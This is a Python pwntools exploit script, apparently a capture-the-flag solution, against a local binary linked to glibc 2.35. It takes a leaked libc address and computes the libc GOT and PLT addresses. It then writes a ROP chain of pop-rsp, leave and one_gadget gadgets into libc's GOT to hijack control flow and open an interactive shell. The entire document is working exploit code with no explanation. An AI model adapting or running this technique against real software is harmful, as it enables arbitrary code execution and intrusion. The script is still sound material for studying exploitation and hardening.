from pwn import *
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.arch='amd64'
# context.log_level='debug'
libc = ELF("/glibc/x64/2.35/lib/libc.so.6")
p = process("../main",env={"LD_PRELOAD":"/glibc/x64/2.35/lib/libc.so.6"})
# gdb.attach(p,'''b *0x7ffff7c2c000''')
base = int(p.readline(),16) - (0x7ff6a25244a0-0x7ff6a24c8000)
libc.address=base
dest = libc.dynamic_value_by_tag("DT_PLTGOT")+base
plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
pop_rsp = 0x00000000000c9fa6+base
sh      = libc.search(b"/bin/sh").__next__()
leave   = 0x00000000000306dd+base
rax     = 0x0000000000044a60+base
one_gadget = 0xf7e22+base
payload = flat([dest+0x18,pop_rsp,rax,one_gadget,leave,dest+0x938,0xdeadbeef,plt0])
p.send(p64(dest+0x8))
success(hex(len(payload)))
p.send(p64(len(payload)))
p.send(payload)
p.interactive()